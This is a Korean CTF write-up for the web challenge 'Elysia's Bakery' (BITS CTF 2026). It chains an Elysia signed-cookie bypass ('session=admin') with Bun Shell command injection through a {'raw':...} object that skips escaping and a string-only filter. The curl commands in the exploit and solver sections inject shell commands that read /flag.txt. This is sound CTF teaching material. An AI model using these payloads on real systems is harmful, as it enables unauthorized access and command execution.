---
title: "[Web] Elysia's Bakery"
description: Writing about the "Elysia's Bakery" of BITS CTF 2026.
date: 2026-02-22 01:00:00 +0900
categories: [CTF, BITS CTF 2026]
tags: [Web]
toc: true
comments: false
---

# Elysia's Bakery (BITS CTF 2026)

---

- Name : Elysia's Bakery
- Category : Web
- Description : Becoming admin shouldn't be too hard?
- Difficulty : ★☆☆
 
---

## TL;DR

이 문제는 **취약점 2개를 연결(chain)** 해서 푸는 웹 문제다.

1. **인증 우회(Auth Bypass)**  
   Elysia의 특정 버전/설정 조합에서 **서명 쿠키 검증 우회**가 가능해서  
   `Cookie: session=admin` 만으로 관리자처럼 접근 가능

2. **관리자 기능 RCE(Command Injection)**  
   `/admin/list`가 내부적으로 `ls ${folder}` 를 실행하는데,  
   `folder`를 문자열이 아닌 `{"raw":"..."}` 객체로 넣으면 Bun Shell이 이스케이프를 생략하여 **명령 주입 가능**

최종적으로:
- `folder={"raw":">/dev/null && cat /flag.txt"}`
- 실행 결과가 `ls >/dev/null && cat /flag.txt` 형태가 되어 flag를 읽을 수 있다.

---

## Overview

문제 설명 문구가 **“Becoming admin shouldn't be too hard?”** 라는 점에서 이미 힌트를 준다.

즉, 이 문제는 단일 취약점보다 다음 흐름을 의도한 문제다:

- **Admin 세션 획득(우회)**
- **Admin 전용 기능 악용**
- **RCE로 플래그 파일 접근**

핵심은 “관리자 기능의 입력값이 쉘 명령으로 이어진다”는 점과,  
그 기능에 도달하기 위한 인증이 “생각보다 쉽게” 우회된다는 점이다.

---

## Solution

### 1) Recon

소스/엔드포인트 동작을 보면 `/admin/list`는 관리자 전용 API이며,  
`folder` 값을 받아 해당 경로의 파일 목록을 반환하는 기능이다.

예상 요청 형태:
```http
POST /admin/list
Cookie: session=admin
Content-Type: application/json

{"folder":"."}
```

이런 류의 기능은 보통 아래 둘을 먼저 의심한다:

- **인증 로직(session/cookie)**
- **명령 실행(`ls`, `find`, `cat`) 사용 여부**

이 문제는 둘 다 취약했다.

---

### 2) Root cause

#### 2-1) Auth Bypass: Signed Cookie 검증 우회

서버는 `session` 쿠키를 이용해 사용자를 식별하고,  
해당 쿠키는 원래 **서명(signature)** 으로 보호되어야 한다.

정상 동작이라면:
- 클라이언트가 `session=admin` 을 임의로 넣어도
- 서버는 “서명 불일치”를 감지해서 거부해야 한다.

하지만 특정 Elysia 버전/설정(특히 `cookie.secrets` 배열 + `cookie.sign`) 조합에서
**서명 검증 실패 시에도 쿠키 값을 신뢰하는 우회 케이스**가 발생할 수 있다.

그 결과:
- 공격자가 **서명 없이** `Cookie: session=admin` 을 보내도
- 서버가 이를 admin 세션으로 처리하게 된다.

✅ 즉, “signed cookie”가 사실상 **unsigned cookie처럼 동작**하게 된 것.

---

#### 2-2) RCE: Bun Shell `raw` 객체를 통한 명령 주입

관리자 기능 `/admin/list` 는 내부적으로 다음과 같은 구조를 가진다:

```ts
const result = $`ls ${folder}`.quiet();
```

겉보기에는 위험해 보이지만, Bun Shell의 템플릿 리터럴은 기본적으로 `${...}` 값을 escape 해준다.  
그래서 `folder`가 평범한 문자열이면 바로 인젝션되지는 않는다.

문제는 Bun Shell이 **특수 객체 형태**를 지원한다는 점:

- `{"raw": "..."}` 형태를 넣으면
- 해당 값은 **escape 없이 그대로 삽입**된다.

즉, 개발자가 안전하다고 생각한 템플릿 shell도 `raw`를 허용하면 다시 위험해진다.

---

#### 2-3) 입력 검증 우회: 타입 체크 허점

문제 코드의 검증은 대략 다음과 같은 느낌이다:

```ts
if (typeof folder === "string" && folder.includes("..")) {
  // 차단
}
```

문제점:
- `folder`가 **문자열일 때만** 검사한다.
- 따라서 `folder`를 object(`{"raw":"..."}`)로 넣으면 이 검사를 아예 안 탄다.

즉, 공격자는 다음을 동시에 달성한다:

- `typeof folder !== "string"` → 필터 우회
- `{raw: ...}` → escape 우회
- 결과적으로 **쉘 명령 실행**

---

### 3) Exploit

#### Step 1. 관리자 접근 확인
아래 요청이 200 + 파일 목록 JSON이면 인증 우회 성공이다.

```bash
curl -i -s -X POST 'http://chals.bitskrieg.in:32274/admin/list' \
  -H 'Content-Type: application/json' \
  -H 'Cookie: session=admin' \
  --data '{"folder":"."}'
```

---

#### Step 2. RCE 테스트 (`id`)
`raw`를 이용해 실제 명령 실행이 되는지 확인한다.

```bash
curl -i -s -X POST 'http://chals.bitskrieg.in:32274/admin/list' \
  -H 'Content-Type: application/json' \
  -H 'Cookie: session=admin' \
  --data '{"folder":{"raw":">/dev/null && id"}}'
```

- 원래 명령은 `ls ${folder}`
- payload로 인해 실질적으로 `ls >/dev/null && id`
- `id` 결과가 응답에 나오면 RCE 성공

---

#### Step 3. Flag 읽기
최종 payload:

```bash
curl -s -X POST 'http://chals.bitskrieg.in:32274/admin/list' \
  -H 'Content-Type: application/json' \
  -H 'Cookie: session=admin' \
  --data '{"folder":{"raw":">/dev/null && cat /flag.txt"}}'
```

응답
```json
{"files":["BITSCTF{..}"]}
```

---

### 4) Why it works

아래 순서대로 보면 이해가 쉽다.

#### (1) 왜 `session=admin` 이 먹히나?
서버가 쿠키를 “서명된 값”으로 가정하고 admin 여부를 판단하지만,  
특정 설정/버그 때문에 **서명 검증 실패가 제대로 막히지 않음**.

→ 결국 임의 쿠키 `session=admin` 이 통과

---

#### (2) 왜 `folder={"raw":"..."}` 가 위험한가?
개발자는 `ls ${folder}` 를 안전하다고 생각했을 수 있지만,  
Bun Shell은 `raw` 객체를 받으면 escape를 하지 않는다.

→ `${folder}` 자리에 **쉘 문법 그대로 삽입**

---

#### (3) 왜 필터를 우회할 수 있나?
필터가 문자열만 검사하기 때문.

- `folder`가 문자열이면 검사함
- `folder`가 object면 검사 안 함

→ object + raw 조합으로 검증/escape를 한 번에 우회

---

## Solver

```bash
# Admin bypass + RCE + flag read
curl -s -X POST 'http://chals.bitskrieg.in:32274/admin/list' \
  -H 'Content-Type: application/json' \
  -H 'Cookie: session=admin' \
  --data '{"folder":{"raw":">/dev/null && cat /flag.txt"}}'
```

### flag만 추출
```bash
curl -s -X POST 'http://chals.bitskrieg.in:32274/admin/list' \
  -H 'Content-Type: application/json' \
  -H 'Cookie: session=admin' \
  --data '{"folder":{"raw":">/dev/null && cat /flag.txt"}}' \
| grep -o 'BITSCTF{[^}]*}'
```

---

## Exploit Chain Diagram (요약 흐름)

```text
[Client]
   |
   | 1) Cookie: session=admin
   v
[Server] --(signed cookie 검증 우회)--> [Admin 권한 획득]
   |
   | 2) POST /admin/list {"folder":{"raw":"..."}}
   v
[Bun Shell] --(raw 객체로 escape 생략)--> ls >/dev/null && cat /flag.txt
   |
   v
[Response JSON에 flag 포함]
```

---

## Flag
```text
BITSCTF{dc10bd7ec1d0dacaf5ca3022aa80b058}
```

---
<img width="604" height="103" alt="image" src="https://github.com/user-attachments/assets/4d3c5733-66dd-4a5d-8305-0194c5a2ff41" />

---

